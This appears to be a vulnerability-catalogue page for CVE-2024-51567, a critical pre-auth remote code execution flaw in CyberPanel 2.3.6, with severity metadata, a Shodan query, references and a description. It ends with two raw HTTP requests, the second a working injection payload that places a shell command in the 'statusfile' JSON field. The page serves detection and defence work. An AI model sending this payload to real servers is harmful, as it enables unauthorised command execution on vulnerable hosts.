---
layout: post
cve_id: CVE-2024-51567
title: CyberPanel v2.3.6 Pre-Auth Remote Code Execution
pcap: true
pcap_path: /pcaps/2024/CVE-2024-51567.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-51567.yaml
snort2_rule: N/A
snort3_rule: N/A
author: DhiyaneshDK
severity: critical
remediation: 'Apply the latest security patches and updates from the vendor to address
  this vulnerability.

  '
impact: Attackers can exploit this vulnerability by crafting malicious requests that
  bypass authentication controls, allowing them to inject and execute arbitrary commands
  on the underlying server.
reference:
- https://community.cyberpanel.net/t/cyberpanel-2-1-remote-code-execution-rce/31760
- https://dreyand.rs/code/review/2024/10/27/what-are-my-options-cyberpanel-v236-pre-auth-rce
- https://cwe.mitre.org/data/definitions/420.html
- https://cwe.mitre.org/data/definitions/78.html
- https://cyberpanel.net/KnowledgeBase/home/change-logs/
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
  cvss-score: 10
  cve-id: CVE-2024-51567
  cwe-id: CWE-306
  epss-score: 0.9431
  epss-percentile: 0.99943
  cpe: cpe:2.3:a:cyberpanel:cyberpanel:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 2
  vendor: cyberpanel
  product: cyberpanel
  shodan-query: html:"CyberPanel"
tags:
- cve
- cve2024
- cyberpanel
- rce
- intrusive
- kev
- vkev
- vuln
---

## üîç Vulnerability Description
upgrademysqlstatus in databases/views.py in CyberPanel (aka Cyber Panel) before 5b08cd6 allows remote attackers to bypass authentication and execute arbitrary commands via /dataBases/upgrademysqlstatus by bypassing secMiddleware (which is only for a POST request) and using shell metacharacters in the statusfile property, as exploited in the wild in October 2024 by PSAUX. Versions through 2.3.6 and (unpatched) 2.3.7 are affected.


## üåê HTTP Request
```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
PUT /dataBases/upgrademysqlstatus HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh: Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15
Connection: close
Content-Length: 54
Content-Type: application/json
Cookie: csrftoken=wEhkEQ
Referer: /
X-CSRFToken: wEhkEQ
Accept-Encoding: gzip
{"statusfile":"/dev/null; id; #","csrftoken":"wEhkEQ"}
```

